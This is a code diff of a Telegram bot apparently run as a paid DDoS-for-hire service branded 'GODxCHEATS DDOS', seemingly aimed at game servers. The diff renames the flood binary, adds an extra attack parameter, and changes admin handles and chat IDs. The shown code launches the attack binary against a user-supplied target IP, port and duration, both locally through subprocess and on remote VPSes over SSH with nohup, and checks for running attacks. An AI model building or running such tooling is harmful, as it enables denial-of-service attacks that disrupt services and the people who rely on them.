@@ -80,7 +80,7 @@ keyboard.add(telebot.types.KeyboardButton("HELP"))
 
 
 
-#GAURAV#
+#GAURAV BHAI#
 
 user_screenshot_status = {}
 
@@ -288,7 +288,7 @@ def start_attack_reply(message, target, port, duration):
 
     # Start the actual attack using subprocess
 
-    subprocess.run(f"./bgmi {target} {port} {duration}", shell=True)
+    subprocess.run(f"./RAJ {target} {port} {duration} 500", shell=True)
 
     
 
@@ -310,7 +310,7 @@ def send_welcome(message):
 
     
 
-    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **GAURAV BHAI DDOS**! 💥
+    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **GODxCHEATS DDOS**! 💥
 
     
 
@@ -644,7 +644,7 @@ def add_user(message):
 
     else:
 
-        response = "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗 𝚞𝚜𝚎 @𝙶𝚘𝚍𝚡𝙰𝚕𝚘𝚗𝚎𝙱𝚘𝚢."
+        response = "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗 𝚞𝚜𝚎 @GAURAV_BHAI1."
 
     bot.reply_to(message, response)
 
@@ -1088,7 +1088,7 @@ def check_vps_status(vps_name):
 
         # Check if attack binary exists and is executable
 
-        stdin, stdout, stderr = ssh.exec_command("ls -la Alone/bgmi")
+        stdin, stdout, stderr = ssh.exec_command("ls -la Alone/RAJ")
 
         output = stdout.read().decode().strip()
 
@@ -1108,7 +1108,7 @@ def check_vps_status(vps_name):
 
         # Check if attack is already running
 
-        stdin, stdout, stderr = ssh.exec_command("ps aux | grep bgmi | grep -v grep")
+        stdin, stdout, stderr = ssh.exec_command("ps aux | grep RAJ | grep -v grep")
 
         running_processes = stdout.read().decode().strip()
 
@@ -1316,7 +1316,7 @@ def handle_vps_selection(message):
 
 
 
-        command = f"cd Alone && nohup ./bgmi {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']}  > /dev/null 2>&1 &"
+        command = f"cd Alone && nohup ./RAJ {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']} 500 > /dev/null 2>&1 &"
 
         ssh.exec_command(command)
 
@@ -1494,7 +1494,7 @@ def help_button(message):
 
         usage /vpsremove <vps name>
 
-        example /vpsremove gaurav 
+        example /vpsremove gaurabhai 
 
        
 
@@ -1528,7 +1528,7 @@ def pay_button(message):
 
 # Replace 'admin_chat_id' with the actual chat ID of the admin
 
-admin_chat_id = '1662672529'
+admin_chat_id = '6539807903'
 
 
 
@@ -1578,7 +1578,7 @@ def plan_button(message):
 
 
 
-    𝗔𝗗𝗠𝗜𝗡 -- ( @GAURAV_BHAI1) 👑
+    𝗔𝗗𝗠𝗜𝗡 -- ( @GAURAV_BHAI1 ) 👑
 
 
 
